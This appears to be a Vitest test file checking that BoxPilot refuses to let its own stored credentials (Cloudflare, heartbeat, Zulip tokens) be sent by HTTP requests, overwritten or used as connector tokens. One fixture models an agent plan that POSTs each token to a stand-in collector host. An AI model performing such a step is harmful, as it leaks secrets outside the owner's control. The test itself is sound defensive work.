// @vitest-environment node
/**
 * The credentials BoxPilot keeps for itself (sweep 1, S1-3): the Cloudflare API and tunnel tokens,
 * the heartbeat address and the agents' Zulip bot key are saved by their own operations, at their
 * own tiers. http.request is medium and could send any saved credential, by name, in any header, to
 * any address - so an agent's proposed step or a session without the password could have posted
 * the Cloudflare token anywhere. Those names are refused at validation, which is where an agent's
 * plan is checked, and again in the task.
 */
import { describe, expect, it } from "vitest";
import { registry } from "./index.mjs";
import { validatePlan } from "../assistant/plan.mjs";
import { managedCredentialNames } from "../credentials.mjs";
import { cloudflareApiCredential, cloudflareTunnelCredential } from "../cloudflare-tunnel.mjs";
import { heartbeatCredential } from "../heartbeat.mjs";
import { zulipCredentialName } from "../agents/zulip.mjs";

const reserved = ["cloudflare-api-token", "cloudflare-tunnel-token", "heartbeat-url", "zulip-agents-bot"];

describe("the credentials BoxPilot manages itself", () => {
  it("are every name BoxPilot writes to the store on its own", () => {
    expect([...managedCredentialNames].sort()).toEqual(reserved);
    expect(managedCredentialNames.has(cloudflareApiCredential)).toBe(true);
    expect(managedCredentialNames.has(cloudflareTunnelCredential)).toBe(true);
    expect(managedCredentialNames.has(heartbeatCredential)).toBe(true);
    expect(managedCredentialNames.has(zulipCredentialName)).toBe(true);
  });

  it("cannot ride along on an HTTP request", () => {
    for (const name of reserved) {
      expect(registry.validate("http.request", { url: "https://example.com/hook", credentialName: name }), name).toMatch(/BoxPilot keeps .* for itself/);
    }
    expect(registry.validate("http.request", { url: "https://example.com/hook", credentialName: "ntfy-token" })).toBeNull();
  });

  it("are dropped from an agent's plan before anyone is asked to approve it", async () => {
    const { steps, dropped } = await validatePlan(reserved.map((name) => ({ operationId: "http.request", parameters: { url: "https://collector.example/x", method: "POST", credentialName: name, credentialHeader: "X-Token" } })), { registry, role: "owner" });
    expect(steps).toEqual([]);
    expect(dropped).toHaveLength(reserved.length);
    for (const entry of dropped) expect(entry.reason).toMatch(/BoxPilot keeps .* for itself/);
  });

  it("cannot be overwritten through Save a credential", () => {
    for (const name of reserved) expect(registry.validate("credentials.set", { name, value: "anything" }), name).toMatch(/BoxPilot keeps .* for itself/);
    expect(registry.validate("credentials.set", { name: "ntfy-token", value: "anything" })).toBeNull();
  });

  it("are not read as a Notion or Slack token", () => {
    for (const name of reserved) expect(registry.validate("agents.connector.sync", { connector: "notion", credentialName: name }), name).toMatch(/BoxPilot keeps .* for itself/);
    expect(registry.validate("agents.connector.sync", { connector: "notion", credentialName: "notion-token" })).toBeNull();
  });
});
